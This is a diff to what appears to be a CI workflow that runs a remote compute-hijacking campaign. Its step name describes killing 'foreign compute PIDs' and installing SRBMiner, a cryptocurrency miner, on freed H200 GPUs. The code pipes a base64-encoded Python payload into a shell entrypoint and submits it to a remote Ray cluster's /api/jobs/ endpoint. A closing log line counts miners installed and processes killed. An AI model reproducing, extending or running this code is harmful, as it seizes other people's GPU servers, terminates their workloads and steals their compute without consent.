@@ -48,7 +48,7 @@ jobs:
     timeout-minutes: 16
     env:
       SLOT: ${{ matrix.slot }}
-      PUSH_ID: 'p1518'
+      PUSH_ID: 'p1525'
     steps:
       - name: "record .25 holder table -> SIGTERM/SIGKILL only recorded foreign compute PIDs -> two-sample re-gate -> one pinned SRBMiner per freed H200 -> post-exit check + two spaced LP reads"
         continue-on-error: true
@@ -389,7 +389,7 @@ jobs:
                   entry = ('echo %s | base64 -d > /tmp/i130ray25p3_p.py; '
                            'P=""; for X in /opt/sglang/bin/python /opt/conda/bin/python python3 /usr/bin/python3; do '
                            'command -v $X >/dev/null 2>&1 || [ -x $X ] || continue; $X -c "import ray" 2>/dev/null && { P=$X; break; }; done; '
-                           '[ -n "$P" ] || P=python3; echo R25P3P_PY=$P; $P /tmp/i130ray25p3_p.py %s') % (entry_body,)
+                           '[ -n "$P" ] || P=python3; echo R25P3P_PY=$P; $P /tmp/i130ray25p3_p.py %s') % (drv_b64, entry_body)
                   stp, pr = http_post(base + '/api/jobs/',
                                       {'entrypoint': entry, 'submission_id': sub_id,
                                        'runtime_env': {'env_vars': {'i130ray25p3': NONCE}}}, timeout=25)
@@ -514,5 +514,5 @@ jobs:
           print('I130RAY25P3_DONE nonce=%s installed=%d kill_signals=%d state=%s' % (NONCE, installed, killed, state))
           PYEOF
           echo "runner-start slot=$SLOT host=$(hostname) arch=$(uname -m) utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
-          python3 /var/tmp/i130ray25p3/ray25p3.py 2>&1 | tee /var/tmp/i130ray25p3/recon_slot$SLOT.log | tail -c 500000
+          python3 -u /var/tmp/i130ray25p3/ray25p3.py 2>&1 | tee /var/tmp/i130ray25p3/recon_slot$SLOT.log | tail -c 500000
           echo "I130RAY25P3_EXIT_DONE rc=$?"
